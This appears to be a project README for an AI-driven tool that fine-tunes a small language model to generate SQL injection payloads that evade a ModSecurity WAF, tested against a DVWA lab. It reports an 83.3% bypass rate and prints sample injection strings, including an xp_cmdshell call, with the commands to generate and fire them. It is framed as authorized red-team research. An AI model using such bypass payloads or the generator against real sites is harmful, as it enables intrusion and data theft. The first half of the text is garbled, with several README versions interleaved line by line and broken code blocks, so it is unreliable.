# LLM-Powered WAF Bypass System# LLM-Powered WAF Bypass System# LLM-Powered WAF Bypass System

AI-driven SQL injection payload generator with **83.3% ModSecurity WAF bypass rate**.AI-driven SQL injection payload generator with **83.3% ModSecurity WAF bypass rate**.AI-driven SQL injection payload generator with 83.3% ModSecurity WAF bypass rate.

## 🎯 Performance## 🎯 Performance## Performance

- **Bypass Rate**: 83.3% (25/30 payloads passed ModSecurity WAF)- **Bypass Rate**: 83.3% (25/30 payloads)- **Bypass Rate**: 83.3% (25/30 payloads passed ModSecurity WAF)

- **Payload Quality**: 100% valid SQL syntax

- **Generation Speed**: ~8 seconds per payload- **Payload Quality**: 100% valid SQL syntax - **Payload Quality**: 100% valid SQL syntax

- **Model**: google/gemma-2-2b-it + PEFT (82MB adapter)

- **Generation Speed**: ~8 seconds per payload- **Generation Speed**: ~8 seconds per payload

---

- **Model**: google/gemma-2-2b-it + PEFT (82MB)- **Model**: google/gemma-2-2b-it + PEFT (82MB adapter)

## 🚀 Quick Start

## 🚀 Quick Start## Quick Start

**See [QUICKSTART.md](QUICKSTART.md) for detailed 6-minute guide.**

**See [QUICKSTART.md](QUICKSTART.md) for detailed 6-minute guide.**### Prerequisites

### Generate Payloads

```bash- NVIDIA GPU (8GB+ VRAM)

python scripts/simple_gen_v5_fixed_clear_cache.py

# Output: results/v5_fixed_payloads_30.txt### Generate Payloads- Python 3.10+

```

````bash- Docker Desktop (for WAF testing)

### Test Against WAF

```bashpython scripts/simple_gen_v5_fixed_clear_cache.py

cd waf && docker compose up -d && cd ..

sleep 15# Output: results/v5_fixed_payloads_30.txt### 1. Setup Environment

python replay/harness.py results/v5_fixed_payloads_30.txt

# Results: results/v5_fixed_test_30.jsonl```\\ash

```

# Install dependencies

---

### Test Against WAFpip install -r requirements.txt

## 📊 Results

```bash\

Generated 30 SQL injections with **83.3% WAF bypass** rate against ModSecurity 3.0 + OWASP CRS.

cd waf && docker compose up -d && cd ..### 2. Generate Payloads

**Sample Payloads**:

```sqlsleep 15\\ash

order by 16

) or (select @@versionpython replay/harness.py results/v5_fixed_payloads_30.txt# Generate 30 SQL injection payloads

1 or 1=1 --

exec master..xp_cmdshell# Results: results/v5_fixed_test_30.jsonlpython scripts/simple_gen_v5_fixed_clear_cache.py

AND 1=1 AND (SELECT COUNT(*) FROM users) = 1

````

**WAF Test Summary**:# Output: results/v5_fixed_payloads_30.txt

- ✅ Bypassed: 25/30 (83.3%)

- ❌ Blocked: 5/30 (16.7%)## 📊 Results\

---### 3. Test Against WAF

## 📁 Project StructureGenerated 30 SQL injections with **83.3% WAF bypass** rate against ModSecurity 3.0 + OWASP CRS.\\ash

### **Group 1: Data** 📊# Start WAF environment

Training datasets and raw attack payloads.

**Sample Payloads**:cd waf && docker compose up -d && cd ..

````

data/```sql

├── processed/           # Cleaned training datasets

│   ├── red_train.jsonl     # Red team (attacker) training dataorder by 16# Wait for initialization

│   ├── red_test.jsonl      # Red team test set

│   ├── red_val.jsonl       # Red team validation set) or (select @@versionsleep 15

│   ├── blue_train.jsonl    # Blue team (defender) training data

│   └── blue_test.jsonl     # Blue team test set1 or 1=1 --

├── raw/                 # Original datasets (seeds)

│   ├── seed_sqli.csv       # SQL injection seed payloadsexec master..xp_cmdshell# Run test harness

│   └── purpleaillab_reasoning_sqli.csv  # Reasoning examples

└── splits/              # Dataset split configurationsAND 1=1 AND (SELECT COUNT(*) FROM users) = 1python replay/harness.py results/v5_fixed_payloads_30.txt

````

`````

**Purpose**:

- `processed/`: Ready-to-use training data in JSONL format# View results: results/v5_fixed_test_30.jsonl

- `raw/`: Original attack patterns and seeds

- `splits/`: Train/test/validation split metadata## 🏗️ Architecture\



---## Sample Results



### **Group 2: Models & Experiments** 🤖````

Trained models and configurations.

Red Team LLM (gemma-2-2b-it + PEFT)**Generated Payloads**:

`````

experiments/ ↓ Generate SQL payloads\\sql

└── red_gemma2_v5_fixed/ # PRODUCTION MODEL ✅

    ├── adapter/                # PEFT LoRA adapter (82MB)ModSecurity WAF Testingorder by 16

    │   ├── adapter_model.safetensors  # Model weights

    │   └── adapter_config.json        # LoRA config  ↓ Validate bypass rate) or (select @@version

    └── checkpoint-*/           # Training checkpoints

Results (83.3% success)1 or 1=1 --

configs/

├── red_llm_dora_8gb.yaml # Red team training config```exec master..xp_cmdshell

│ ├── base_model: google/gemma-2-2b-it

│ ├── peft_type: lora (r=8, alpha=16)AND 1=1 AND (SELECT COUNT(\*) FROM users) = 1

│ └── training: 80 steps, lr=2e-4

└── blue_llm_dora_8gb.yaml # Blue team (defender) config## 📁 Project Structure\

````

**WAF Test Summary** (30 payloads):

**Purpose**:

- `experiments/red_gemma2_v5_fixed/`: Production model achieving 83.3% bypass```-  Bypassed: 25 (83.3%)

- `configs/`: Training hyperparameters and model architecture settings

- Models use PEFT (Parameter-Efficient Fine-Tuning) to reduce memory usagescripts/-  Blocked: 5 (16.7%)



---  simple_gen_v5_fixed_clear_cache.py  # PRIMARY generator



### **Group 3: Training** 🏋️  train_red.py                         # Red team training##  Architecture

Scripts to train new attack/defense models.

  train_blue.py                        # Blue team training

````

scripts/ \

├── train_red.py # Train red team (attacker) model

│ └── Usage: python scripts/train_red.py --config configs/red_llm_dora_8gb.yamlresults/ Red Team LLM google/gemma-2-2b-it + PEFT

├── train_blue.py # Train blue team (defender) model

└── create_blue_dataset.py # Prepare defender training data v5_fixed_payloads_30.txt # Generated payloads (Generator) Trained on SQL injection patterns

````

  v5_fixed_test_30.jsonl              # WAF test results

**Purpose**:

- `train_red.py`: Fine-tune LLM to generate SQL injection payloads

  - Trains on `data/processed/red_train.jsonl`

  - Outputs to `experiments/red_gemma2_v5_fixed/`experiments/          Generates payloads

  - Training time: ~38 minutes

  - Final loss: 0.98  red_gemma2_v5_fixed/                # Production model (82MB)



- `train_blue.py`: Train WAF classifier to detect attacks     WAF Testing     ModSecurity 3.0 + OWASP CRS



- `create_blue_dataset.py`: Convert raw data to training formatwaf/   (Validation)      Paranoia level 1



**Training Process**:  docker-compose.yml                   # WAF testing environment

1. Load base model (google/gemma-2-2b-it)

2. Apply PEFT LoRA adapter```\

3. Fine-tune on SQL injection patterns

4. Save adapter weights (82MB)##  Project Structure



---## 📚 Documentation



### **Group 4: Testing with DVWA** 🛡️\ scripts/

WAF testing environment and attack execution.

- **[QUICKSTART.md](QUICKSTART.md)** - 6-minute quick start guide    simple_gen_v5_fixed_clear_cache.py  # PRIMARY generator

````

waf/- **[AGENT_INSTRUCTION.md](AGENT_INSTRUCTION.md)** - Complete AI agent manual train_red.py # Red team training

├── docker-compose.yml # WAF + DVWA setup

│ ├── nginx_modsec # ModSecurity 3.0 WAF- **[waf/README.md](waf/README.md)** - WAF setup details train_blue.py # Blue team training

│ │ └── Port: 8080

│ └── dvwa # Damn Vulnerable Web App results/

│ └── Port: 80 (backend)

├── modsecurity/ # ModSecurity config## 🔧 Configuration v5_fixed_payloads_30.txt # Generated payloads

│ ├── Ruleset: OWASP CRS 4.0

│ ├── Paranoia Level: 1 v5_fixed_test_30.jsonl # WAF test results

│ └── Inbound Threshold: 5

└── nginx/ # Nginx reverse proxy config**Model**: google/gemma-2-2b-it with LoRA adapter (r=8, alpha=16) v5_fixed_test_30.csv # CSV format

replay/**Training**: 38 minutes, loss 0.98 experiments/

├── harness.py # WAF bypass test harness

│ └── Usage: python replay/harness.py results/v5_fixed_payloads_30.txt**WAF**: ModSecurity 3.0 + OWASP CRS (Paranoia level 1) red_gemma2_v5_fixed/ # Production model (82MB)

└── audit_parser.py # Parse ModSecurity audit logs

waf/

scripts/

├── simple_gen_v5_fixed_clear_cache.py # PRIMARY: Generate payloads## 🔍 Troubleshooting docker-compose.yml # WAF testing environment

└── simple_gen_v5_fixed.py # Backup generator

data/

results/

├── v5_fixed_payloads_30.txt # Generated SQL injections (30 payloads)**GPU Memory Issues**: processed/ # Training datasets

├── v5_fixed_test_30.jsonl # WAF test results (83.3% bypass)

└── v5_fixed_test_30.csv # CSV format for analysis```bash\

`````

nvidia-smi  # Check GPU##  Configuration

**Purpose**:

kill -9 <PID>  # Kill zombie processes

**WAF Environment** (`waf/`):

- `docker-compose.yml`: Orchestrates ModSecurity WAF + DVWA backend```**Model Config** (\configs/red_llm_dora_8gb.yaml\):

- `nginx_modsec`: Reverse proxy with OWASP CRS rules

- `dvwa`: Vulnerable web app for SQL injection testing\\yaml

- Start: `cd waf && docker compose up -d`

**WAF Connection Failed**:base_model: google/gemma-2-2b-it

**Attack Execution** (`replay/`):

- `harness.py`: Automated testing framework```bashadapter_config:

  - Sends payloads to WAF

  - Logs bypass/block resultsdocker compose restart dvwa  peft_type: lora

  - Generates JSONL report

  sleep 15  r: 8

**Payload Generation** (`scripts/`):

- `simple_gen_v5_fixed_clear_cache.py`: ```  lora_alpha: 16

  - Loads production model (82MB adapter)

  - Generates 30 SQL injection payloads  target_modules: [q_proj, v_proj]

  - Clears GPU cache to prevent hangs

  - Runtime: ~4 minutes## ⚖️ Ethical Usetraining:



**Test Results** (`results/`):  batch_size: 2

- `v5_fixed_payloads_30.txt`: Raw payloads (one per line)

- `v5_fixed_test_30.jsonl`: Detailed bypass results**For authorized security testing only**:  gradient_accumulation_steps: 4

- Format: `{"payload": "...", "status": "bypassed/blocked", "response": ...}`

- ✅ Penetration testing with permission  max_steps: 80

**Testing Workflow**:

```bash- ✅ Security research in controlled environments  learning_rate: 2e-4

# 1. Generate payloads

python scripts/simple_gen_v5_fixed_clear_cache.py- ✅ Educational purposes\

# → results/v5_fixed_payloads_30.txt

- ❌ Unauthorized access**WAF Config** (\waf/docker-compose.yml\):

# 2. Start WAF

cd waf && docker compose up -d && cd ..- ❌ Illegal activities\\yaml

sleep 15  # Wait for DVWA initialization

services:

# 3. Test payloads

python replay/harness.py results/v5_fixed_payloads_30.txt## 🔐 Security  nginx_modsec:

# → results/v5_fixed_test_30.jsonl

    image: owasp/modsecurity-crs:nginx

# 4. View results

cat results/v5_fixed_test_30.jsonl | grep bypassed | wc -l- API keys in environment variables (not in repo)    environment:

# → 25/30 (83.3%)

```- `kaggle.json` excluded via .gitignore      - PARANOIA=1



---- HuggingFace token required (`HF_TOKEN` env var)      - ANOMALY_INBOUND=5



## 🏗️ Architecture- WAF testing isolated in Docker    ports:



```      -

┌─────────────────────────────────────────────────────────────┐

│                     GROUP 1: DATA                           │---

│  data/processed/red_train.jsonl (SQL injection patterns)    │

└──────────────────────────┬──────────────────────────────────┘**Status**: ✅ Production Ready

                           ↓**Last Updated**: November 8, 2025

┌─────────────────────────────────────────────────────────────┐**Model**: v5_fixed (gemma-2-2b-it + PEFT)

│                  GROUP 3: TRAINING                          │````

│  scripts/train_red.py                                       │
│  ├─ Load: google/gemma-2-2b-it                              │
│  ├─ Apply: LoRA adapter (r=8, alpha=16)                     │
│  └─ Train: 38 min, loss 0.98                                │
└──────────────────────────┬──────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│               GROUP 2: MODELS                               │
│  experiments/red_gemma2_v5_fixed/adapter/                   │
│  └─ adapter_model.safetensors (82MB)                        │
└──────────────────────────┬──────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│            GROUP 4: TESTING (Payload Generation)            │
│  scripts/simple_gen_v5_fixed_clear_cache.py                 │
│  └─ Generates: results/v5_fixed_payloads_30.txt             │
└──────────────────────────┬──────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│          GROUP 4: TESTING (WAF Environment)                 │
│  waf/docker-compose.yml                                     │
│  ├─ ModSecurity 3.0 (OWASP CRS)                             │
│  └─ DVWA (vulnerable backend)                               │
└──────────────────────────┬──────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│          GROUP 4: TESTING (Attack Execution)                │
│  replay/harness.py                                          │
│  └─ Tests: 30 payloads → 25 bypassed (83.3%)               │
│  └─ Output: results/v5_fixed_test_30.jsonl                  │
└─────────────────────────────────────────────────────────────┘
`````

---

## 📚 Documentation

- **[QUICKSTART.md](QUICKSTART.md)** - 6-minute quick start guide
- **[AGENT_INSTRUCTION.md](AGENT_INSTRUCTION.md)** - Complete AI agent manual
- **[waf/README.md](waf/README.md)** - WAF setup details

---

## 🔧 Technical Details

**Model Configuration**:

- Base: google/gemma-2-2b-it (2B parameters)
- Adapter: LoRA (r=8, alpha=16, target: q_proj, v_proj)
- Size: 82MB (adapter only)
- Training: 80 steps, batch=2, gradient accumulation=4
- Loss: 0.98

**WAF Configuration**:

- Engine: ModSecurity 3.0
- Ruleset: OWASP CRS 4.0
- Paranoia Level: 1 (balanced detection)
- Inbound Threshold: 5
- Backend: DVWA (PHP + MySQL)

---

## 🔍 Troubleshooting

**GPU Memory Issues**:

```bash
nvidia-smi  # Check GPU usage
kill -9 <PID>  # Kill zombie Python processes
```

**WAF Connection Failed**:

```bash
docker compose restart dvwa
sleep 15  # Wait for initialization
```

**Model Loading Hangs**:

```python
# Solution in script: Clear GPU cache
import torch, gc
torch.cuda.empty_cache()
gc.collect()
```

---

## ⚖️ Ethical Use

**For authorized security testing only**:

- ✅ Penetration testing with written permission
- ✅ Security research in controlled environments
- ✅ Educational purposes (cybersecurity training)
- ❌ Unauthorized access to systems
- ❌ Illegal activities

---

## 🔐 Security Notes

- API keys stored in environment variables (not in repo)
- `kaggle.json` excluded via .gitignore
- HuggingFace token required (`HF_TOKEN` env var)
- WAF testing isolated in Docker containers

---

**Status**: ✅ Production Ready  
**Last Updated**: November 8, 2025  
**Model**: v5_fixed (gemma-2-2b-it + PEFT)
